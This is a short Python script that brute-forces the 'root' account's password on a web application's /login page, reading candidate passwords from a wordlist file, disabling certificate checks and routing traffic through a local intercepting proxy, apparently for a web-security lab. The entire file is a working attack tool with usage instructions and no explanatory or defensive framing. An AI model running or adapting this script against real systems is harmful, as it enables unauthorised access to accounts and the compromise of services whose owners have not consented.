import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def brut_forcer(s,url): 
         
    with open("pass.txt", "r") as passwords:
        for line in passwords:
            password = line.strip()
            data = {"username":"root","password":password}
            r= s.post(f"{url}/login",data=data,verify = False, proxies = proxies)
            if "Log out" in r.text:
                print ("(+) Login as root successful")
                break
            else:
                print(f"tried code: {password}")
            
            
                

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    s = requests.Session()    
    url = sys.argv[1]
    print("(+)  Starting Brute Froce...")
    brut_forcer(s,url)
    
if __name__ == "__main__":
    main()
   